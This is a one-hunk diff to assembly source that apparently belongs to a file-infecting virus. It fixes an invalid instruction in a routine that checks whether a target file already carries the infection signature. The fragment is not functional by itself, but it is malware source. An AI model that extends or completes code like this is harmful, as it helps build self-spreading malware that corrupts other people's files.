@@ -170,7 +170,7 @@ section .text
     .check_infect:
         mov rcx, dword Traza_position
         mov rsi, rax
-        movzx rbx, dword VAR(Famine.file_original_len)
+        mov ebx, dword VAR(Famine.file_original_len)
         add rsi, rbx
         sub rsi, rcx
         lea rdi, Traza
